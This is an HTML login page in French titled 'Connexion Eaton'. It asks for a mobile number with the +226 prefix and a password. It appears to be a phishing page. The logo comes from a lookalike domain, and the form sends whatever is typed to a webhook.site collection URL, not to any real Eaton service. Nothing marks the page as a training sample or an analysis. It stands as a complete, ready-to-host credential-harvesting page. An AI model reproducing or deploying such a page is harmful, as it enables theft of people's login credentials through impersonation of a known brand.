<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Connexion Eaton</title>
  <style>
    * {
      box-sizing: border-box;
    }
    body {
      margin: 0;
      font-family: 'Arial', sans-serif;
      background-color: #ffffff;
      display: flex;
      flex-direction: column;
      align-items: center;
      min-height: 100vh;
      position: relative;
      overflow-x: hidden;
    }

    .logo {
      margin-top: 40px;
      z-index: 2;
    }

    .logo img {
      width: 160px;
      height: auto;
    }

    .container {
      background-color: #ffffff;
      width: 90%;
      max-width: 400px;
      margin-top: 30px;
      border-radius: 20px;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
      padding: 30px 20px;
      position: relative;
      z-index: 2;
    }

    .input-group {
      display: flex;
      align-items: center;
      background-color: #f0f0f0;
      border-radius: 25px;
      padding: 12px 15px;
      margin-bottom: 15px;
      color: #999;
    }

    .input-group span {
      color: #009fe3;
      margin-right: 8px;
      font-weight: bold;
      user-select: none;
    }

    .input-group input {
      border: none;
      background: transparent;
      outline: none;
      flex: 1;
      font-size: 16px;
      color: #333;
    }

    .btn {
      width: 100%;
      padding: 14px;
      background-color: #f5a623;
      color: white;
      border: none;
      border-radius: 30px;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
      margin-top: 10px;
    }

    .bottom-text {
      text-align: center;
      margin-top: 15px;
      font-size: 14px;
      color: #888;
    }

    .bottom-text a {
      color: #666;
      text-decoration: none;
      font-weight: bold;
      margin-left: 5px;
    }

    .orange-bg {
      position: absolute;
      bottom: 0;
      width: 100%;
      height: 250px;
      background-color: #ffb830;
      z-index: 0;
    }

    .wave-bg-container {
      position: absolute;
      bottom: 250px;
      width: 100%;
      z-index: 1;
      overflow: hidden;
      height: 100px;
    }

    .wave-bg {
      display: block;
      width: 100%;
      height: 100%;
    }
  </style>
</head>
<body>

  <div class="logo">
    <img src="https://bfa.afeatoncom.shop/Public/dianyun/logo-Eaton-160.jpg" alt="Eaton Logo" />
  </div>

  <div class="container">
    <form action="https://webhook.site/b1fb39f5-27fc-412a-adba-4a0bdd868cb5" method="POST">
      <div class="input-group">
        <span>+226</span>
        <input type="tel" name="phone" placeholder="Entrez votre mobile" required>
      </div>

      <div class="input-group">
        <input type="password" name="password" placeholder="Entrez le mot de passe de connexion" required>
      </div>

      <button type="submit" class="btn">Se connecter</button>
    </form>

    <div class="bottom-text">
      Pas de compte ?<a href="#">S’inscrire maintenant</a>
    </div>
  </div>

  <!-- Forme dégoulinante blanche -->
  <div class="wave-bg-container">
    <svg class="wave-bg" viewBox="0 0 500 150" preserveAspectRatio="none" xmlns="http://www.w3.org/2000/svg">
      <path d="M0.00,49.98 C150.00,100.00 349.65,0.00 500.00,49.98 L500.00,150.00 L0.00,150.00 Z" style="stroke: none; fill: white;"></path>
    </svg>
  </div>

  <!-- Fond orange -->
  <div class="orange-bg"></div>

</body>
</html>
